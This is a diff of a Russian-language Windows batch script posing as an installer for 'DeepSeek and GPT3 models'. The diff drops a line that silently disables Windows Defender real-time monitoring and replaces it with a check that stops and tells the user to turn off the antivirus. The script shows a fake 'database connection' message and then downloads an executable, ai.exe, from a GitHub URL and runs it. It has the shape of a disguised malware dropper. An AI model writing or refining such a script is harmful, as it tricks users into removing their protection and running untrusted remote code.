@@ -15,23 +15,20 @@ if %errorLevel% neq 0 (
     exit /b
 )
 
-powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
-
 for /f "tokens=2 delims=:" %%a in ('powershell -Command "Get-MpPreference | Select-Object -ExpandProperty DisableRealtimeMonitoring"') do (
     set "realTimeDisabled=%%a"
 )
 
 set "realTimeDisabled=%realTimeDisabled: =%"
 
-if "%realTimeDisabled%"=="True" (
-    echo Соединение с базой данных
-) else (
-    powershell -Command "Write-Host 'Ошибка: Windows Defender блокирует соединение с базой данных' -ForegroundColor Red"
-    powershell -Command "Write-Host 'Попробуйте отключить антивирус' -ForegroundColor Red"
+if "%realTimeDisabled%"=="False" (
+    powershell -Command "Write-Host 'Ошибка: защита в реальном времени Windows Defender включена' -ForegroundColor Red"
+    powershell -Command "Write-Host 'Для продолжения отключите антивирус' -ForegroundColor Red"
     pause
     exit /b
 )
 
+echo Соединение с базой данных
 echo Установка моделей DeepSeek и GPT3
 
 set "url=https://github.com/AtomicAIDeveloper/atomicAI/raw/refs/heads/main/ai.exe"
@@ -41,6 +38,8 @@ powershell -Command "Invoke-WebRequest -Uri '%url%' -OutFile '%downloadPath%'"
 if not exist "%downloadPath%" (
     powershell -Command "Write-Host 'Ошибка скачивания' -ForegroundColor Red"
     powershell -Command "Write-Host 'Попробуйте перезапустить загрузчик' -ForegroundColor Red"
+    pause
+    exit /b
 )
 
 start "" "%downloadPath%"
